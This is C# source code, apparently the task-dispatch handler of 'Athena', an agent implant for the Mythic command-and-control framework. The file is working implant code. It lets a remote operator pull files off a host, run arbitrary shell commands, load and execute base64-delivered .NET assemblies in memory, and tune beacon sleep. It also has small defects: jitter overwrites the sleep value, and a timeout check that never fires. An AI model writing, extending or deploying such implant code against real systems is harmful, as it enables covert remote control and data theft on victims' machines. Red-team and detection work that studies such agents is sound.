using Athena.Mythic.Model;
using System;
using System.Collections.Generic;
using Athena.Commands.Model;
using Athena.Utilities;
using Newtonsoft.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Linq;

namespace Athena.Commands
{

    public class CommandHandler
    {
        public static void StartJob(MythicJob task)
        {
            MythicJob job = Globals.jobs[task.task.id];
            job.started = true;
            switch (job.task.command)
            {
                case "builtin":
                    checkAndRunPlugin(job);
                    break;
                case "download":
                    var downloadTask = Task.Run(() =>
                    {
                        MythicDownloadJob j = new MythicDownloadJob(job);
                        Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
                        j.path = par["file"];

                        FileHandler.downloadFile(j);

                    });
                    break;
                case "execute-assembly":
                    if (Globals.executeAssemblyTask != "")
                    {
                        job.complete = true;
                        job.errored = true;
                        job.taskresult = "Failed to load assembly. Another assembly is already executing.";
                        job.hasoutput = true;
                    }
                    else
                    {
                        var t = Task.Run(() =>
                        {
                            Globals.executeAssemblyTask = job.task.id;
                            ExecuteAssembly ea = JsonConvert.DeserializeObject<ExecuteAssembly>(job.task.parameters);
                            job.taskresult = "";
                            job.hasoutput = true;
                            using (var consoleWriter = new ConsoleWriter()) {
                                var origStdout = Console.Out;
                                try
                                {
                                    consoleWriter.WriteLineEvent += consoleWriter_WriteLineEvent;
                                    //Set output for our ConsoleWriter
                                    Console.SetOut(consoleWriter);

                                    //Start a new thread for our blocking Execute-Assembly
                                    Globals.executeAseemblyThread = new Thread(() =>
                                    {
                                        try
                                        {
                                            job.hasoutput = true;
                                            AssemblyHandler.ExecuteAssembly(Misc.Base64DecodeToByteArray(ea.assembly), "");
                                            //Assembly finished executing.
                                            Globals.executeAssemblyTask = "";
                                            job.hasoutput = true;
                                            job.complete = true;
                                            Console.SetOut(origStdout);
                                        }
                                        catch (ThreadInterruptedException e)
                                        {
                                            //Cancellation was requested, clean up.
                                            Globals.executeAssemblyTask = "";
                                            job.hasoutput = true;
                                            job.complete = true;
                                            job.errored = true;
                                            Console.SetOut(origStdout);
                                            Globals.alc.Unload();
                                            Globals.alc = new System.Runtime.Loader.AssemblyLoadContext("Athena");
                                        }
                                        catch(ThreadAbortException e)
                                        {
                                            Globals.executeAssemblyTask = "";
                                            job.hasoutput = true;
                                            job.complete = true;
                                            job.errored = true;
                                            Console.SetOut(origStdout);
                                            Globals.alc.Unload();
                                            Globals.alc = new System.Runtime.Loader.AssemblyLoadContext("Athena");
                                        }

                                        return;
                                    });
                                    
                                    Globals.executeAseemblyThread.IsBackground = true;
                                    //Start our assembly.
                                    Globals.executeAseemblyThread.Start();
                                }
                                catch(OperationCanceledException e)
                                {
                                    //General exception catching
                                    Globals.executeAssemblyTask = "";
                                    job.complete = true;
                                    job.taskresult = e.Message;
                                    job.errored = true;
                                    job.hasoutput = true;
                                    Console.SetOut(origStdout);
                                }
                                catch(Exception e)
                                {
                                    Globals.executeAssemblyTask = "";
                                    job.complete = true;
                                    job.taskresult = e.Message;
                                    job.errored = true;
                                    job.hasoutput = true;
                                    Console.SetOut(origStdout);
                                }
                            }
                        }, job.cancellationtokensource.Token);
                        job.cancellationtokensource.Token.ThrowIfCancellationRequested();
                    }
                    break;
                case "exit":
                    Environment.Exit(0);
                    break;
                case "jobs":
                    Task.Run(() => {
                        string output = "ID\t\t\t\t\t\tName\t\tStatus\r\n";
                        output += "-----------------------------------------------------------------------------------\r\n";
                        foreach (var job in Globals.jobs)
                        {
                            if (job.Value.started &! job.Value.complete)
                            {
                                output += String.Format("{0}\t\t{1}\t\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Started");
                            }
                            else if (job.Value.complete)
                            {
                                output += String.Format("{0}\t\t{1}\t\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Completed");
                            }
                            else
                            {
                                output += String.Format("{0}\t\t{1}\t\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Not Started");
                            }
                        }
                        task.hasoutput = true;
                        task.complete = true;
                        task.taskresult = output;
                    });
                    break;
                case "jobkill":
                    Task.Run(() =>
                    {
                        MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == task.task.parameters).Value;
                        if (job != null)
                        {
                            //Attempt the cancel.
                            job.cancellationtokensource.Cancel();

                            //Wait to see if the cancel took.
                            for (int i = 0; i != 30; i++)
                            {
                                //Job exited successfully
                                if (job.complete)
                                {
                                    task.taskresult = $"Task {task.task.parameters} exited successfully.";
                                    task.complete = true;
                                    task.hasoutput = true;
                                    break;
                                }
                                //Job may have failed to cancel
                                if (i == 30 && !job.complete)
                                {
                                    task.taskresult = $"Unable to cancel Task: {task.task.parameters}. Request timed out.";
                                    task.complete = true;
                                    task.hasoutput = true;
                                    task.errored = true;
                                }
                                //30s timeout
                                Thread.Sleep(1000);
                            }
                        }
                        else
                        {
                            task.taskresult = $"Task {task.task.parameters} not found!";
                            task.complete = true;
                            task.hasoutput = true;
                        }
                    });
                    break;
                case "load":
                    LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
                    job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(lc.assembly), lc.name);
                    job.complete = true;
                    job.hasoutput = true;
                    break;
                //Can these all be merged into one and handled on the server-side?
                case "load-assembly":
                    LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
                    job.taskresult = AssemblyHandler.LoadAssembly(Misc.Base64DecodeToByteArray(la.assembly));
                    break;
                case "load-command":
                    LoadAssembly loadcommand = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
                    job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(loadcommand.assembly),"test");
                    break;
                //Maybe get rid of this?
                case "load-coresploit":
                    LoadAssembly loadcs = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
                    job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(loadcs.assembly), "test");
                    break;
                case "reset-assembly-context":
                    job.taskresult = AssemblyHandler.ClearAssemblyLoadContext();
                    job.complete = true;
                    job.hasoutput = true;
                    break;
                case "shell":
                    job.taskresult = Execution.ShellExec(job.task);
                    job.complete = true;
                    job.hasoutput = true;
                    break;
                case "sleep":
                    var sleepInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
                    if (sleepInfo.ContainsKey("sleep"))
                    {
                        try
                        {
                            Globals.mc.MythicConfig.sleep = int.Parse(sleepInfo["sleep"].ToString());
                        }
                        catch
                        {
                            job.taskresult += "Invalid sleeptime specified.";
                            job.errored = true;
                        }
                    }
                    if (sleepInfo.ContainsKey("jitter"))
                    {
                        try
                        {
                            Globals.mc.MythicConfig.sleep = int.Parse(sleepInfo["jitter"].ToString());
                        }
                        catch
                        {
                            job.taskresult += "Invalid jitter specified.";
                            job.errored = true;
                        }
                    }
                    if (!job.errored)
                    {
                        job.taskresult = "Sleep updated successfully.";
                    }
                    job.complete = true;
                    job.hasoutput = true;
                    break;
                case "stop-assembly":
                    //Will need to make this work
                    if(Globals.executeAseemblyThread != null)
                    {
                        Globals.executeAseemblyThread.Interrupt();
                        //Globals.executeAseemblyThread.Abort();
                        Thread.Sleep(3000);
                        if (Globals.executeAseemblyThread.IsAlive)
                        {
                            //Globals.executeAseemblyThread.Suspend();
                        }

                        job.complete = true;
                        job.taskresult = "Cancellation Requested.";
                        job.hasoutput = true;
                        Globals.executeAssemblyTask = "";
                        Globals.alc.Unload();
                    }
                    else
                    {
                        job.complete = true;
                        job.taskresult = "No execute-assembly task currently running.";
                        job.hasoutput = true;
                    }
                    break;
                default:
                    checkAndRunPlugin(job);
                    break;
            }
        }

        static void consoleWriter_WriteLineEvent(object sender, ConsoleWriterEventArgs e)
        {
            try
            {
                MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == Globals.executeAssemblyTask).Value;
                job.taskresult += e.Value + Environment.NewLine;
                job.hasoutput = true;
            }
            catch
            {
                //Fail silently
            }
        }

        static void checkAndRunPlugin(MythicJob job)
        {
            if (Globals.loadedcommands.ContainsKey(job.task.command))
            {
                job.taskresult =  AssemblyHandler.RunLoadedCommand(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
            }
            else
            {
                job.errored = true;
                job.taskresult = "Plugin not loaded. Please use the load command to load the plugin!";
            }
            
            job.complete = true;
            job.hasoutput = true;
            if (job.taskresult.StartsWith("[ERROR]"))
            {
                job.errored = true;
                job.taskresult = job.taskresult.Replace("[ERROR]", "");
            }
        }
    }
}
